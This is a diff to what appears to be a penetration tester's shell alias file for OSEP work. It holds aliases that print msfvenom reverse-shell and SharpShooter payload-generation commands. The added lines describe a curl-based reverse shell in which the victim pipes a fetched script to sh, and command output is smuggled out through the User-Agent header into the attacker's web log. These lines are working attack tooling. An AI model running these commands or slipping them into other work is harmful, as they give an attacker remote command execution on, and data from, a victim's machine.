@@ -92,3 +92,13 @@ alias venom32='echo "msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=443 
 
 # SharpShooter
 alias sharpshooter='echo "cd ~/Desktop/SharedFolder/01-Certifications/01-OffensiveSecurity/OSEP/Tools/SharpShooter/;python SharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile /var/www/html/shell.txt --output test;mv output/* /var/www/html/"'
+
+# Semi Interactive Curl Reverse Shell
+# Place either in http://127.1/rev
+# Create http://127.1/command with desired command
+# Tail apache2 access.log
+# curl -s -A "$(curl -s http://127.0.0.1/command | sh)" http://127.0.0.1 > /dev/null
+# curl -s -A "`curl -s http://127.0.0.1/command | sh`" http://127.0.0.1 > /dev/null
+
+# Exec on victim
+# curl http://127.0.0.1/rev | sh
